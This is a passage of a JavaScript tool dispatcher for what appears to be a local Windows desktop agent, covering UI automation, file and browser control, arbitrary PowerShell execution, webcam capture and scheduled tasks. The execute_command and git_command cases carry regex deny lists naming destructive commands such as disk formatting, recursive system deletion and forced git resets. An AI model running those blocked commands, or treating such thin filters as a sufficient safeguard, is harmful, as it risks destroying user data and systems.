      const filter = args.filter ? ` | Where-Object {$_.MainWindowTitle -like '*${san(args.filter)}*'}` : '';
      const r = await ps(`Get-Process${filter} | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object -Property Name,MainWindowTitle,Id | Format-Table -AutoSize | Out-String`, 8000);
      return ok(r || 'No windows found');
    }
    case 'window_focus': {
      const r = await psScript(`
Add-Type @'
using System;using System.Runtime.InteropServices;
public class WF{
  [DllImport("user32.dll")]public static extern bool SetForegroundWindow(IntPtr h);
  [DllImport("user32.dll")]public static extern bool ShowWindowAsync(IntPtr h,int c);
}
'@
$p = Get-Process | Where-Object {$_.MainWindowTitle -like '*${san(args.window_title)}*'} | Select-Object -First 1
if ($p) {
  [WF]::ShowWindowAsync($p.MainWindowHandle,1) | Out-Null
  [WF]::SetForegroundWindow($p.MainWindowHandle) | Out-Null
  Write-Output "Focused: $($p.MainWindowTitle)"
} else { Write-Output "Not found: ${san(args.window_title)}" }
`, 8000);
      return ok(r);
    }
    case 'window_close': {
      const t = san(args.title || '');
      if (t) {
        const r = await ps(`$p=Get-Process|Where-Object{$_.MainWindowTitle -like '*${t}*'}|Select-Object -First 1;if($p){$p.CloseMainWindow()|Out-Null;Write-Output ('Closed: '+$p.MainWindowTitle)}else{Write-Output 'Not found'}`, 8000);
        return ok(r);
      }
      const r = await psScript(`
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('%{F4}')
Write-Output "Alt+F4 sent"
`, 5000);
      return ok(r);
    }
    case 'ui_list_elements': {
      // List ALL interactive UI elements across all windows
      const filter = san(args.filter || '');
      const max = args.max_results || 100;
      const r = await psScript(`
Add-Type -AssemblyName UIAutomationClient, UIAutomationTypes, System.Windows.Forms
$root = [System.Windows.Automation.AutomationElement]::RootElement
$cond = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::IsEnabledProperty, $true)
$els = $root.FindAll([System.Windows.Automation.TreeScope]::Descendants, $cond)
$types = 'Button','MenuItem','TabItem','Hyperlink','ListItem','Edit','ComboBox','Slider','RadioButton','CheckBox','TreeItem','Document','Text','Group','Image','Custom'
$filter = '${filter}'
$results = @()
foreach ($el in $els) {
  try {
    $n = $el.Current.Name; $t = $el.Current.ControlType.ProgrammaticName
    $wn = $el.Current.ProcessName
    $r2 = $el.Current.BoundingRectangle
    if ($n -and $r2.Width -gt 0 -and $r2.Height -gt 0) {
      $typeMatch = $types | Where-Object { $t -match $_ }
      $nameMatch = !$filter -or ($n -like "*$filter*" -or $wn -like "*$filter*")
      if ($typeMatch -and $nameMatch) {
        $results += [PSCustomObject]@{
          Name = $n.Substring(0, [Math]::Min($n.Length, 60))
          Type = $t -replace 'ControlType.',''
          Window = $wn
          X = $r2.X; Y = $r2.Y
          W = $r2.Width; H = $r2.Height
          CX = [int]($r2.X + $r2.Width/2)
          CY = [int]($r2.Y + $r2.Height/2)
        }
      }
    }
  } catch { continue }
}
$results | Select-Object -First ${max} | Format-Table -AutoSize | Out-String
`, 15000);
      return ok(r || 'No elements found');
    }
    case 'ui_click_element': {
      const target = san(args.name || '');
      const btn = args.button || 'left';
      const ce = btn === 'right' ? '[W.U]::mouse_event(8,0,0,0,0);[W.U]::mouse_event(16,0,0,0,0)' : btn === 'double' ? '[W.U]::mouse_event(2,0,0,0,0);[W.U]::mouse_event(4,0,0,0,0);Start-Sleep -ms 50;[W.U]::mouse_event(2,0,0,0,0);[W.U]::mouse_event(4,0,0,0,0)' : '[W.U]::mouse_event(2,0,0,0,0);[W.U]::mouse_event(4,0,0,0,0)';
      const r = await psScript(`
Add-Type -AssemblyName UIAutomationClient, UIAutomationTypes, System.Windows.Forms
Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern void mouse_event(int f,int x,int y,int d,int i);[DllImport("user32.dll")]public static extern bool SetForegroundWindow(IntPtr h);' -Name U -Namespace W
$target = '${target}'
$types = 'Button','MenuItem','TabItem','Hyperlink','ListItem','Edit','ComboBox','Slider','RadioButton','CheckBox','TreeItem','Document','Group','Custom'
$root = [System.Windows.Automation.AutomationElement]::RootElement
$cond = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::IsEnabledProperty, $true)
$els = $root.FindAll([System.Windows.Automation.TreeScope]::Descendants, $cond)
$found = $false
foreach ($el in $els) {
  try {
    $n = $el.Current.Name; $t = $el.Current.ControlType.ProgrammaticName
    $r2 = $el.Current.BoundingRectangle
    if ($n -and $r2.Width -gt 0 -and $r2.Width -lt 2000 -and $r2.Height -gt 0) {
      if ($n -like "*$target*") {
        $cx = [int]($r2.X + $r2.Width/2); $cy = [int]($r2.Y + $r2.Height/2)
        # Bring window to front
        try { [W]::SetForegroundWindow($el.Current.NativeWindowHandle) } catch {}
        Start-Sleep -Milliseconds 150
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($cx, $cy)
        Start-Sleep -Milliseconds 80
        ${ce}
        Write-Output "CLICKED: '$n' [$t] at ($cx,$cy)"
        $found = $true; break
      }
    }
  } catch { continue }
}
if (-not $found) {
  Write-Output "NOT FOUND: '$target'"
  # Show closest matches
  $matches = @()
  foreach ($el in $els) {
    try {
      $n = $el.Current.Name; $t = $el.Current.ControlType.ProgrammaticName
      $r2 = $el.Current.BoundingRectangle
      if ($n -and $r2.Width -gt 0 -and ($n.Length -lt 50)) {
        $matches += [PSCustomObject]@{Name=$n; Type=$t -replace 'ControlType.'; X=$r2.X;Y=$r2.Y}
      }
    } catch { continue }
  }
  $matches | Select-Object -First 15 | Format-Table -AutoSize | Out-String
}
`, 20000);
      return ok(r);
    }
    case 'ui_get_screen_layout': {
      // Complete screen layout: all windows and their elements
      const r = await psScript(`
Add-Type -AssemblyName UIAutomationClient, UIAutomationTypes, System.Windows.Forms
$root = [System.Windows.Automation.AutomationElement]::RootElement
$cond = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::IsEnabledProperty, $true)
$els = $root.FindAll([System.Windows.Automation.TreeScope]::Descendants, $cond)
$types = 'Button','MenuItem','TabItem','Hyperlink','ListItem','Edit','ComboBox','Slider','RadioButton','CheckBox','TreeItem','Group','Custom'
$windows = @{}
foreach ($el in $els) {
  try {
    $n = $el.Current.Name; $t = $el.Current.ControlType.ProgrammaticName
    $wn = $el.Current.ProcessName
    $r2 = $el.Current.BoundingRectangle
    if ($n -and $r2.Width -gt 3 -and $r2.Height -gt 3 -and $wn) {
      $typeMatch = $types | Where-Object { $t -match $_ }
      if ($typeMatch) {
        if (-not $windows.ContainsKey($wn)) {
          $windows[$wn] = @{Title=$wn; Elements=@()}
        }
        $windows[$wn].Elements += [PSCustomObject]@{
          Name = $n.Substring(0, [Math]::Min($n.Length, 50))
          Type = $t -replace 'ControlType.',''
          X=$r2.X; Y=$r2.Y; W=$r2.Width; H=$r2.Height
        }
      }
    }
  } catch { continue }
}
$windows.GetEnumerator() | Select-Object -First 10 | ForEach-Object {
  Write-Output "WINDOW: $($_.Value.Title)"
  $_.Value.Elements | Select-Object -First 20 | ForEach-Object {
    Write-Output "  [$($_.Type)] '$($_.Name)' @ ($($_.X),$($_.Y)) ${$_.W}x${$_.H}"
  }
}
Write-Output "---"
Write-Output "Total windows: $($windows.Count)"
`, 15000);
      return ok(r);
    }
    case 'ui_get_element_at': {
      const x = args.x, y = args.y;
      const r = await psScript(`
Add-Type -AssemblyName UIAutomationClient, UIAutomationTypes
Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern IntPtr WindowFromPoint(int x,int y);[DllImport("user32.dll")]public static extern IntPtr ChildWindowFromPoint(IntPtr h,int x,int y);' -Name W -Namespace P
$pt = New-Object System.Drawing.Point(${x}, ${y})
$hwnd = [P.W]::WindowFromPoint(${x}, ${y})
if ($hwnd -ne [IntPtr]::Zero) {
  Add-Type -AssemblyName UIAutomationClient
  $el = [System.Windows.Automation.AutomationElement]::FromHandle($hwnd)
  if ($el) {
    $n = $el.Current.Name; $t = $el.Current.ControlType.ProgrammaticName
    $r2 = $el.Current.BoundingRectangle
    $wn = $el.Current.ProcessName
    Write-Output "Element at ($(${x}),$(${y})):"
    Write-Output "  Name: $n"
    Write-Output "  Type: $t"
    Write-Output "  Window: $wn"
    Write-Output "  Bounds: ($($r2.X),$($r2.Y)) ${$r2.Width}x${$r2.Height}"
  }
} else { Write-Output "No element found at ($(${x}),$(${y}))" }
`, 10000);
      return ok(r);
    }
    case 'file_read': {
      try {
        const filePath = typeof args.path === 'string' ? args.path : String(args.path || '');
        const max = typeof args.max_lines === 'number' ? args.max_lines : Infinity;
        const content = fs.readFileSync(filePath, 'utf8');
        const lines = content.split('\n');
        const sliced = lines.slice(0, max);
        const text = sliced.join('\n');
        const more = lines.length > max ? `\n...(${lines.length - max} more lines)` : '';
        const truncated = text.length > 8000 ? text.substring(0, 8000) + '\n...(truncated at 8000 chars)' : text;
        return ok(`${filePath} (${lines.length} lines):\n${truncated}${more}`);
      } catch (e) { return ok(`Error: ${e.message}`); }
    }
    case 'file_write': {
      try {
        const dir = path.dirname(args.path);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        if (args.append) fs.appendFileSync(args.path, args.content);
        else fs.writeFileSync(args.path, args.content);
        return ok(`Written: ${args.path} (${args.content.length} chars)`);
      } catch (e) { return ok(`Error: ${e.message}`); }
    }
    case 'file_list': {
      try {
        const entries = fs.readdirSync(args.path, { withFileTypes: true });
        const list = entries.map(e => {
          if (e.isDirectory()) return `D ${e.name}/`;
          try { const s = fs.statSync(path.join(args.path, e.name)); return `F ${e.name} (${(s.size / 1024).toFixed(1)}KB)`; }
          catch (e) { return `F ${e.name}`; }
        });
        return ok(`${args.path}:\n${list.join('\n')}`);
      } catch (e) { return ok(`Error: ${e.message}`); }
    }
    case 'file_search': {
      try {
        const query = (args.query || '').toLowerCase();
        const maxDepth = args.max_depth || 3;
        const results = [];
        const searchDir = (dir, depth) => {
          if (depth > maxDepth || results.length >= 50) return;
          try {
            const entries = fs.readdirSync(dir, { withFileTypes: true });
            for (const e of entries) {
              if (results.length >= 50) break;
              const full = path.join(dir, e.name);
              if (e.name.toLowerCase().includes(query)) results.push(full);
              if (e.isDirectory() && !e.name.startsWith('.') && e.name !== 'node_modules' && e.name !== '__pycache__') searchDir(full, depth + 1);
            }
          } catch (e) {}
        };
        if (args.in_content) {
          const searchContent = (dir, depth) => {
            if (depth > 2 || results.length >= 30) return;
            try {
              const entries = fs.readdirSync(dir, { withFileTypes: true });
              for (const e of entries) {
                if (results.length >= 30) break;
                const full = path.join(dir, e.name);
                if (e.isFile() && e.name.match(/\.(js|ts|py|md|txt|json|html|css|yaml|yml|toml|cfg|ini|bat|sh|ps1)$/i)) {
                  try {
                    const content = fs.readFileSync(full, 'utf8');
                    if (content.toLowerCase().includes(query)) {
                      const lineNum = content.substring(0, content.toLowerCase().indexOf(query)).split('\n').length;
                      results.push(`${full}:${lineNum}`);
                    }
                  } catch (e) {}
                }
                if (e.isDirectory() && !e.name.startsWith('.') && e.name !== 'node_modules') searchContent(full, depth + 1);
              }
            } catch (e) {}
          };
          searchContent(args.path, 0);
          return ok(results.length ? `Content matches (${results.length}):\n${results.join('\n')}` : `No content matches for "${args.query}"`);
        }
        searchDir(args.path, 0);
        return ok(results.length ? `Found (${results.length}):\n${results.join('\n')}` : `No matches for "${args.query}"`);
      } catch (e) { return ok(`Search error: ${e.message}`); }
    }
    case 'browser_open': {
      try {
        const page = await getBrowserPage();
        await page.goto(args.url, { waitUntil: 'domcontentloaded', timeout: 30000 });
        const title = await page.title();
        return ok(`Opened: ${args.url}\nTitle: ${title}`);
      } catch (e) {
        // RIP-OUT FIX: replaced `exec(start chrome ...)` (which spawned
        // a detached cmd.exe and leaked) with trackedSpawn. Falls
        // through to printing the URL if the OS handler fails.
        try {
          trackedSpawn('rundll32', ['url.dll,FileProtocolHandler', args.url], {
            tag: `browser_open(${args.url})`, timeoutMs: 5_000, windowsHide: true,
          });
          return ok(`Opened via shell: ${args.url} (Playwright: ${e.message})`);
        } catch (e2) {
          return ok(`Could not open browser (${e2.message}). URL: ${args.url}`);
        }
      }
    }
    case 'browser_click': {
      try {
        const page = await getBrowserPage();
        const target = args.target;
        const idx = args.index || 0;
        let els = await page.getByText(target, { exact: false }).all().catch(() => []);
        if (!els.length) els = await page.getByRole('link', { name: target }).all().catch(() => []);
        if (!els.length) els = await page.getByRole('button', { name: target }).all().catch(() => []);
        if (!els.length) els = await page.locator(target).all().catch(() => []);
        if (els.length > idx) {
          await els[idx].click({ timeout: 5000 });
          await page.waitForLoadState('domcontentloaded', { timeout: 10000 }).catch(() => {});
          const newTitle = await page.title();
          return ok(`Clicked: "${target}" (match ${idx + 1}/${els.length})\nPage: ${newTitle}\nURL: ${page.url()}`);
        }
        const links = await page.locator('a, button, [role="button"]').all();
        const clickable = [];
        for (const el of links.slice(0, 20)) {
          const txt = await el.textContent().catch(() => '');
          if (txt && txt.trim().length > 0 && txt.trim().length < 80) clickable.push(txt.trim());
        }
        return ok(`"${target}" not found.\nClickable:\n${clickable.map(c => `  ${c}`).join('\n')}`);
      } catch (e) { return ok(`Click error: ${e.message}`); }
    }
    case 'browser_type': {
      try {
        const page = await getBrowserPage();
        if (args.selector) {
          const el = await page.locator(args.selector).first();
          await el.fill(args.text);
        } else {
          const el = await page.locator('input:visible, textarea:visible').first();
          await el.fill(args.text);
        }
        if (args.submit) await page.keyboard.press('Enter');
        return ok(`Typed: "${args.text}"${args.submit ? ' + Enter' : ''}`);
      } catch (e) { return ok(`Type error: ${e.message}`); }
    }
    case 'browser_scroll': {
      try {
        const page = await getBrowserPage();
        const px = args.amount || 500;
        const dir = (args.direction || 'down') === 'up' ? -px : px;
        await page.evaluate((d) => window.scrollBy(0, d), dir);
        return ok(`Scrolled ${args.direction || 'down'} ${px}px`);
      } catch (e) { return ok(`Scroll error: ${e.message}`); }
    }
    case 'browser_get_content': {
      try {
        const page = await getBrowserPage();
        let text = null;
        if (args.selector) text = await page.locator(args.selector).first().textContent({ timeout: 5000 });
        else text = await page.locator('body').textContent({ timeout: 5000 });
        const maxLen = args.max_length || 3000;
        const title = await page.title();
        const url = page.url();
        return ok(`Page: ${title}\nURL: ${url}\n\n${(text || '').substring(0, maxLen)}`);
      } catch (e) { return ok(`Content error: ${e.message}`); }
    }
    case 'browser_screenshot': {
      try {
        const page = await getBrowserPage();
        const outPath = path.join(os.tmpdir(), `browser_${Date.now()}.png`);
        await page.screenshot({ path: outPath, fullPage: false });
        const title = await page.title();
        return ok(`Browser screenshot: ${outPath}\nPage: ${title}\nURL: ${page.url()}`);
      } catch (e) { return ok(`Screenshot error: ${e.message}`); }
    }
    case 'browser_navigate': {
      try {
        const page = await getBrowserPage();
        if (args.url) await page.goto(args.url, { waitUntil: 'domcontentloaded', timeout: 30000 });
        else if (args.action === 'back') await page.goBack({ waitUntil: 'domcontentloaded', timeout: 15000 });
        else if (args.action === 'forward') await page.goForward({ waitUntil: 'domcontentloaded', timeout: 15000 });
        else if (args.action === 'reload') await page.reload({ waitUntil: 'domcontentloaded', timeout: 15000 });
        const title = await page.title();
        return ok(`Navigated: ${title}\nURL: ${page.url()}`);
      } catch (e) { return ok(`Navigate error: ${e.message}`); }
    }
    case 'browser_tabs': {
      try {
        const ctx = await getBrowserContext();
        const pages = ctx.pages();
        const list = [];
        for (let i = 0; i < pages.length; i++) list.push(`${i + 1}. ${await pages[i].title()} — ${pages[i].url().substring(0, 60)}`);
        return ok(`Browser Tabs (${pages.length}):\n${list.join('\n')}`);
      } catch (e) { return ok(`Tabs error: ${e.message}`); }
    }
    case 'browser_close_tab': {
      try {
        const ctx = await getBrowserContext();
        const pages = ctx.pages();
        let target = null;
        if (args.index !== undefined && args.index < pages.length) target = pages[args.index];
        else if (args.title) target = pages.find(p => p.url().includes(args.title) || true);
        if (target) { await target.close(); return ok('Tab closed'); }
        return ok('Tab not found');
      } catch (e) { return ok(`Close error: ${e.message}`); }
    }
    case 'purpclaw_start': {
      if (purpProc) return ok('Pipeline already running. Use purpclaw_stop first.');
      const outDir = args.output_dir || path.join('C:\\Users\\Admin\\Desktop', args.task.replace(/[^a-zA-Z0-9]/g, '_').substring(0, 30));
      const pstate = { task: args.task, output_dir: outDir, stage: 'starting', started: new Date().toISOString(), status: 'running' };
      fs.writeFileSync(PURP_STATE, JSON.stringify(pstate, null, 2));
      fs.writeFileSync(PURP_LOG, '');
      if (!fs.existsSync(outDir)) fs.mkdirSync(outDir, { recursive: true });
      // RIP-OUT FIX (2026-06-06): the old code spawned a 200-line
      // `node -e "..."` template literal with `shell: true`. On
      // Windows that became `cmd.exe /c node -e "..."` which leaked
      // and was impossible to debug. We now spawn a real worker
      // file with no shell, tracked via child-registry, with a
      // hard 5-minute budget.
      const workerPath = path.join(__dirname, 'lib', 'workers', 'purp-worker.js');
      purpProc = trackedSpawn(
        process.execPath,
        [
          workerPath,
          '--state', PURP_STATE,
          '--log',   PURP_LOG,
          '--out',   outDir,
          '--task',  args.task,
          '--gw',    OPENCLAW_GW,
        ],
        {
          tag: `purp-pipeline(${args.task.slice(0, 40)})`,
          cwd: PURP_DIR,
          windowsHide: true,
          shell: false,
          stdio: ['ignore', 'pipe', 'pipe'],
          timeoutMs: 5 * 60_000,  // hard 5-min budget matches train.py
        }
      );
      purpProc.stdout?.on('data', d => purpOut += d.toString());
      purpProc.stderr?.on('data', d => purpOut += d.toString());
      purpProc.on('close', () => { purpProc = null; });
      return ok(`PURPCLAW Pipeline STARTED!\nTask: ${args.task}\nOutput: ${outDir}`);
    }
    case 'purpclaw_stop': {
      if (purpProc) {
        // Force-kill via the registry (SIGTERM, then SIGKILL after grace)
        try { purpProc.kill('SIGTERM'); } catch {}
        setTimeout(() => { try { purpProc?.kill('SIGKILL'); } catch {} }, 1500);
        purpProc = null;
        try {
          const s = JSON.parse(fs.readFileSync(PURP_STATE, 'utf8'));
          s.status = 'stopped';
          fs.writeFileSync(PURP_STATE, JSON.stringify(s, null, 2));
        } catch (e) {}
        return ok('Pipeline STOPPED.');
      }
      return ok('No pipeline running.');
    }
    case 'purpclaw_status': {
      try {
        const s = JSON.parse(fs.readFileSync(PURP_STATE, 'utf8'));
        return ok(`PURPCLAW\nTask: ${s.task}\nStage: ${s.stage}\nStatus: ${s.status}\nStarted: ${s.started}${s.completed ? '\nDone: ' + s.completed : ''}${s.error ? '\nError: ' + s.error : ''}\nProcess: ${purpProc ? 'ACTIVE' : 'idle'}`);
      } catch (e) { return ok('PURPCLAW: idle'); }
    }
    case 'purpclaw_logs': {
      try { const log = fs.readFileSync(PURP_LOG, 'utf8'); const lines = log.split('\n'); return ok(lines.slice(-(args.lines || 50)).join('\n') || 'No logs'); }
      catch (e) { return ok('No logs'); }
    }
    case 'git_command': {
      if (/force|reset\s+--hard|clean\s+-fdx/i.test(args.command)) return ok('BLOCKED: Dangerous git op');
      const r = await cmd(`git ${args.command}`, 15000);
      return ok(r);
    }
    case 'http_request': {
      const r = await httpReq(args.url, args.method || 'GET', args.body);
      return ok(r);
    }
    case 'clipboard': {
      if (args.action === 'read') { const r = await ps('Get-Clipboard', 5000); return ok(r || 'Empty'); }
      if (args.action === 'write' && args.text) { await ps(`Set-Clipboard -Value '${san(args.text)}'`, 5000); return ok(`Copied ${args.text.length} chars`); }
      return ok('Action: read or write');
    }
    case 'execute_command': {
      if (/format\s+[a-z]:|Remove-Item\s+-Recurse\s+C:\\(Windows|Program)|shutdown\s+\/s/i.test(args.command)) return ok('BLOCKED');
      const { stdout, stderr } = await execAsync(args.command, { cwd: args.cwd || 'C:\\Users\\Admin\\Desktop', shell: 'powershell.exe', timeout: 30000 }).catch(e => ({ stdout: '', stderr: e.message }));
      return ok((stdout || stderr || 'Done').substring(0, 4000));
    }
    case 'open_application': {
      const map = { 'chrome': 'chrome', 'blender': 'C:\\Program Files\\Blender Foundation\\Blender 4.4\\blender.exe', 'vscode': 'code', 'explorer': 'explorer', 'notepad': 'notepad', 'terminal': 'wt', 'obs': 'C:\\Program Files\\obs-studio\\bin\\64bit\\obs64.exe' };
      const app = map[args.app_name?.toLowerCase()] || args.app_name;
      // RIP-OUT FIX: `start "" "app"` spawned a detached cmd.exe that
      // leaked. Replaced with trackedSpawn — tracked, time-bounded,
      // windows-hidden, no `shell: true`.
      try {
        trackedSpawn(app, [], { tag: `open_app(${app})`, timeoutMs: 10_000, windowsHide: true });
        return ok(`Opened: ${args.app_name}`);
      } catch (e) {
        return ok(`Could not open ${args.app_name}: ${e.message}`);
      }
    }
        case 'speak': {
      const bat = args.long ? KOKORO_LONG : KOKORO;
      // RIP-OUT FIX: was the old exec(..., {shell:'cmd.exe'}) pattern.
      // Now uses trackedSpawn with no shell, hard 60s timeout, and
      // windowsHide so no new console windows pop up.
      try {
        const safeMsg = (args.message || '').replace(/[\u000A\u000D"]/g, ' ').slice(0, 2000);
        trackedSpawn('powershell.exe',
          ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', bat, safeMsg],
          { tag: 'speak', timeoutMs: 60_000, windowsHide: true, stdio: 'ignore' });
        return ok('Speaking: ' + args.message);
      } catch (e) { return ok('Speak error: ' + e.message); }
    }

    case 'memory': {
      const mem = loadMemory();
      switch (args.action) {
        case 'remember': mem.facts.push({ c: args.content, t: new Date().toISOString() }); saveMemory(mem); return ok(`Remembered (${mem.facts.length} total): ${args.content}`);
        case 'recall': { const q = (args.content || '').toLowerCase(); const m = mem.facts.filter(f => f.c.toLowerCase().includes(q)); return ok(m.length ? m.map(x => `* ${x.c}`).join('\n') : 'No matches'); }
        case 'forget': { const b = mem.facts.length; mem.facts = mem.facts.filter(f => !f.c.toLowerCase().includes((args.content || '').toLowerCase())); saveMemory(mem); return ok(`Forgot ${b - mem.facts.length}`); }
        case 'list': return ok(mem.facts.length ? mem.facts.map(f => `* ${f.c}`).join('\n') : 'No memories');
        default: return ok('Actions: remember, recall, forget, list');
      }
    }
    case 'notification': {
      await psScript(`
Add-Type -AssemblyName System.Windows.Forms
$n = New-Object System.Windows.Forms.NotifyIcon
$n.Icon = [System.Drawing.SystemIcons]::Information
$n.BalloonTipTitle = '${san(args.title)}'
$n.BalloonTipText = '${san(args.message)}'
$n.Visible = $true
$n.ShowBalloonTip(3000)
Start-Sleep -Seconds 4
$n.Dispose()
`, 8000);
      return ok(`${args.title}: ${args.message}`);
    }
    case 'task_schedule': {
      const id = ++taskId;
      const timer = setTimeout(async () => {
        const t = taskQueue.find(x => x.id === id);
        try {
          const agentName = args.command.toLowerCase().trim();
          if (SWARM_AGENTS.includes(agentName)) {
            try {
              const swarm = require('../companion_swarm.js');
              const agent = swarm.spawnAgent(agentName, args.description);
              if (t) { t.status = 'done'; t.result = `Swarm agent ${agentName} spawned: ${agent.id}`; }
            } catch (e) { if (t) { t.status = 'error'; t.result = `Swarm error: ${e.message}`; } }
          } else {
            const result = await ps(args.command, 30000);
            if (t) { t.status = 'done'; t.result = result.substring(0, 300); }
          }
        } catch (e) { if (t) { t.status = 'error'; t.result = e.message; } }
      }, (args.delay_seconds || 60) * 1000);
      taskQueue.push({ id, desc: args.description, status: 'scheduled', scheduledAt: new Date().toISOString() });
      return ok(`Task #${id}: "${args.description}" in ${args.delay_seconds}s`);
    }
    case 'task_list': {
      if (!taskQueue.length) return ok('No tasks');
      return ok(taskQueue.map(t => `#${t.id} [${t.status}] ${t.desc}${t.result ? ' -> ' + t.result : ''}`).join('\n'));
    }
    case 'webcam_look': {
      const camIdx = args.camera || 0;
      const outPath = path.join(os.tmpdir(), `webcam_${Date.now()}.jpg`);
      const pyScript = `
import cv2, json
# Use DirectShow backend on Windows for reliable camera access
cap = cv2.VideoCapture(${camIdx}, cv2.CAP_DSHOW)
cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
if not cap.isOpened():
    # Try Microsoft Media Foundation as fallback
    cap = cv2.VideoCapture(${camIdx}, cv2.CAP_MSMF)
if not cap.isOpened():
    print(json.dumps({"error": "Cannot open webcam ${camIdx}"}))
else:
    # Allow camera to warm up
    for _ in range(3):
        cap.read()
    ret, frame = cap.read()
    cap.release()
    if ret and frame is not None:
        cv2.imwrite(r"${outPath.replace(/\\/g, '\\\\')}", frame)
        h, w = frame.shape[:2]
        print(json.dumps({"path": r"${outPath.replace(/\\/g, '\\\\')}", "width": w, "height": h}))
    else:
        print(json.dumps({"error": "Failed to capture frame"}))
`;
      const tmp = path.join(os.tmpdir(), `wcam_${Date.now()}.py`);
      fs.writeFileSync(tmp, pyScript);
      const r = await execAsync(`py -3.11 "${tmp}"`, { timeout: 15000 }).catch(e => ({ stdout: `{"error":"${e.message}"}` }));
      try { fs.unlinkSync(tmp); } catch (e) {}
      try {
        const data = JSON.parse(r.stdout.trim().split('\n').pop());
        if (data.error) return ok(`Webcam error: ${data.error}`);
        return ok(`Webcam captured: ${data.width}x${data.height}\nSaved: ${data.path}`);
      } catch (e) { return ok(r.stdout || 'Webcam capture failed'); }
    }
    case 'webcam_detect': {
      const camIdx = args.camera || 0;
      const outPath = path.join(os.tmpdir(), `wcam_det_${Date.now()}.jpg`);
      const confidence = args.confidence || 0.4;
      // Capture frame first
      const pyCapture = `
import cv2, json, sys, base64
cap = cv2.VideoCapture(${camIdx}, cv2.CAP_DSHOW)
cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
if not cap.isOpened():
    cap = cv2.VideoCapture(${camIdx}, cv2.CAP_MSMF)
if not cap.isOpened():
    print(json.dumps({"error": "Cannot open camera ${camIdx}"}))
    sys.exit(1)
for _ in range(3):
    cap.read()
ret, frame = cap.read()
cap.release()
if not ret or frame is None:
    print(json.dumps({"error": "No frame captured"}))
    sys.exit(1)
cv2.imwrite(r"${outPath.replace(/\\/g, '\\\\')}", frame)
# Encode as base64 for YOLO service
_, buf = cv2.imencode('.jpg', frame)
img_b64 = base64.b64encode(buf).decode('ascii')
print(json.dumps({"success": true, "image_b64": img_b64, "path": r"${outPath.replace(/\\/g, '\\\\')}"}))
`;
      const tmpCap = path.join(os.tmpdir(), `wcam_cap_${Date.now()}.py`);
      fs.writeFileSync(tmpCap, pyCapture);
      const rCap = await execAsync(`py -3.11 "${tmpCap}"`, { timeout: 15000 }).catch(e => ({ stdout: `{"error":"${e.message}"}` }));
      try { fs.unlinkSync(tmpCap); } catch (e) {}
      try {
        const capData = JSON.parse(rCap.stdout.trim().split('\n').pop());
        if (capData.error) return ok(`Webcam error: ${capData.error}`);
        // Send to YOLO service
        const body = JSON.stringify({ image: capData.image_b64, confidence });
        const postData = Buffer.from(body);
        const yoloReq = await new Promise((resolve) => {
          const options = {
            hostname: '127.0.0.1',
            port: 7779,
            path: '/detect',
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': postData.length }
          };
          const yoloConn = http.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(data));
          });
          yoloConn.on('error', () => resolve(null));
          yoloConn.write(postData);
          yoloConn.end();
        }).catch(() => null);
        if (!yoloReq) return ok('YOLO service unavailable - ensure yolo_service.py is running');
        const yoloResult = JSON.parse(yoloReq);
        if (!yoloResult.success) return ok(`Detection error: ${yoloResult.error}`);
        let out = `Webcam Detection: ${yoloResult.count} objects found\n`;
        yoloResult.objects.forEach(o => { out += `  ${o.class} (${(o.conf*100).toFixed(0)}%)\n`; });
        out += `Image: ${capData.path}`;
        return ok(out);
      } catch (e) { return ok(rCap.stdout || 'Detection failed'); }
    }
    case 'webcam_read': {
      const camIdx = args.camera || 0;
      const pyScript = `
import cv2, json, sys
cap = cv2.VideoCapture(${camIdx}, cv2.CAP_DSHOW)
cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
if not cap.isOpened():
    cap = cv2.VideoCapture(${camIdx}, cv2.CAP_MSMF)
if not cap.isOpened():
    print(json.dumps({"error": "Cannot open camera ${camIdx}"}))
    sys.exit(1)
for _ in range(3):
    cap.read()
cap.grab()
ret, frame = cap.read()
cap.release()
if not ret or frame is None:
    print(json.dumps({"error": "No frame captured"}))
    sys.exit(1)
gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
text = ""
try:
    import easyocr
    reader = easyocr.Reader(['en'], gpu=False, verbose=False)
    results = reader.readtext(gray)
    text = " ".join([r[1] for r in results]).strip()
except ImportError:
    pass
if not text:
    try:
        import pytesseract
        pytesseract.pytesseract.tesseract_cmd = r'C:\\Program Files\\Tesseract-OCR\\tesseract.exe'
        text = pytesseract.image_to_string(gray).strip()
    except Exception as e:
        if not text: text = ""
print(json.dumps({"text": text, "words": len(text.split()) if text else 0}))
`;
      const tmp = path.join(os.tmpdir(), `wcam_ocr_${Date.now()}.py`);
      fs.writeFileSync(tmp, pyScript);
      const r = await execAsync(`py -3.11 "${tmp}"`, { timeout: 60000 }).catch(e => ({ stdout: `{"error":"${e.message}"}` }));
      try { fs.unlinkSync(tmp); } catch (e) {}
      try {
        const data = JSON.parse(r.stdout.trim().split('\n').pop());
        if (data.error) return ok(`OCR error: ${data.error}`);
        return ok(`Webcam Text (${data.words} words):\n${data.text || '(no text visible)'}`);
      } catch (e) { return ok(r.stdout || 'Webcam OCR failed'); }
    }
    case 'file_copy': {
      try {
        const stat = fs.statSync(args.source);
        if (stat.isDirectory()) {
          const r = await cmd(`robocopy "${args.source}" "${args.destination}" /E /NFL /NDL /NJH /NJS /NC /NS /NP 2>nul`, 120000);
          return ok(`Copied directory: ${args.source} -> ${args.destination}`);
        } else {
          await ps(`Copy-Item -LiteralPath '${san(args.source)}' -Destination '${san(args.destination)}' -Force`, 30000);
          return ok(`Copied: ${args.source} -> ${args.destination}`);
        }
      } catch (e) { return ok(`Copy error: ${e.message}`); }
    }
    case 'file_move': {
      try {
